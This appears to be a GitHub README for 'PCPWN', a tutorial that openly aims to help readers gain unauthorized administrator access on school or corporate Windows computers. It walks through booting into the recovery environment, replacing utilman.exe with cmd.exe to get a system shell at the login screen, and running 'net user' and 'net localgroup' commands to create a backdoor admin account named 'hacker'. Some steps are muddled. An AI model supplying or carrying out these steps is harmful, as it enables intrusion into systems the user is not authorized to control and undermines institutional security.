
<p align="center">
<img src="https://cdn-icons-png.flaticon.com/512/207/207130.png", width="200", height="200">
</p>

<h1 align="center"> [ PCPWN ]</h1>
<h4 align="center">How can I obtain administrative privileges on a school computer
</h4>

### DESCRIPTION
PCPWN is an informative tutorial that guides you through the process of gaining unauthorized access to administrative privileges on a computer within a school or corporate environment, all without relying on the pre-existing company-created admin account.

### 1. Access Windows RE (Recovery Environment):
  Start by accessing recovery mode on the target system.
    
  #### When the computer is turned off:

        Press and hold the Windows Key and press the power button.
        Release both keys.

 #### From the Windows Logon screen:
        Click the Power Button icon.
        Hold the SHIFT Key and click Restart.

  Select "Repair Your Computer," then navigate to "Troubleshoot," and finally, select "Command Prompt."

### 2. Utilizing Command Prompt:
    In the Command Prompt, type notepad to open the Notepad text editor.
    select file | click save as | select this pc | select all files |

### 3. Changing Utilman to Command Prompt:
    Navigate to drive X (replace X with the appropriate drive).
    Go to System32 and rename cmd to utilman.
    Exit the Command Prompt.

### 4. Adding a User Account:
    Return to the login screen and click on "Ease of Access Icon."
    Type the following command: 
    net user hacker hacker /add 
    net localgroup Administrators hacker /add
   
### 5. Logging In with the New Account with admin priv:
    Log in with your non-administrator account.
    Open PowerShell as an administrator.
    Type username: DOMAIN\hacker password: hacker
